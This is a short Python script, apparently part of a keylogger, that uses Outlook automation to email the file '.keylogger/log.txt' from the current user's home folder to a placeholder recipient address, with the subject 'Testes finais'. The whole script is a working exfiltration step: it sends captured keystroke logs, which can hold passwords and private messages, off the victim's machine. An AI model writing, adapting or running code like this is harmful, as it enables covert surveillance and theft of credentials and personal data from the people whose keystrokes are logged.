
import win32com.client as win32
import getpass

usuario = getpass.getuser()

outlook = win32.Dispatch('outlook.application')

email = outlook.CreateItem(0)

email.To = 'seu e-mail'
email.Subject = 'Testes finais'
email.HTMLBody = '''
<p>Anexo do log txt</p>
'''
# local do anexo
anexo = f"C://Users/{usuario}/.keylogger/log.txt"

email.Attachments.Add(anexo)

email.Send()
